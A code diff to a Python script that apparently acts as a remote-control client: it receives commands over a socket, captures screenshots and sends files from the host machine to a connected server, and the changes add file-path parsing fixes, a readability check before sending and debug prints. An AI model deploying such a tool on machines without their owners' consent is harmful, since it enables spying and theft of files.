@@ -9,8 +9,11 @@ from PIL import ImageGrab
 
 
 def format_filename(commande):
-    file_path = commande.split(" ")[1]
+    # remove only the first word
+    file_path = commande.split(" ", 1)[1]
+    file_path = file_path.replace('"', '')
     if '/' in file_path:
+        print("file_path: ", file_path)
         return file_path.split("/")[-1], file_path
     elif '\\' in file_path:
         return file_path.split("\\")[-1], file_path
@@ -44,18 +47,28 @@ def upload_feature(filename, conn):
 
 def download_feature(file_path, conn):
     print(f"Uploading {file_path}...")
-    # Send the file size (8 bytes)
-    file_size = os.path.getsize(file_path)
-    conn.send(file_size.to_bytes(8, 'big'))
-    print(f"Sent file size: {file_size} bytes")
 
-    # Send the file in chunks of 1024 bytes
-    with open(file_path, "rb") as file:
-        while chunk := file.read(1024):
-            conn.send(chunk)
+    # check if file exist and is readable
+    if os.path.exists(file_path) and os.access(file_path, os.R_OK):
+        print(f"File {file_path} exist")
+        conn.send(b"File OK")
 
-    print("File uploaded successfully")
-    conn.send(b"\nFile uploaded successfully")
+        # Send the file size (8 bytes)
+        file_size = os.path.getsize(file_path)
+        conn.send(file_size.to_bytes(8, 'big'))
+        print(f"Sent file size: {file_size} bytes")
+
+        # Send the file in chunks of 1024 bytes
+        with open(file_path, "rb") as file:
+            while chunk := file.read(1024):
+                conn.send(chunk)
+
+        print("File uploaded successfully")
+        conn.send(b"\nFile uploaded successfully")
+
+    else:
+        print(f"The file {file_path} doesn't exist or is not readable.")
+        conn.send(b"File not found")
 
 
 def take_screenshot():
@@ -99,6 +112,9 @@ def connect_to_server():
 
     while True:
         command = conn.recv(1024).decode('utf-8')
+
+        print(f"Received command: {command}")
+
         if command.lower() == "close":
             break
 
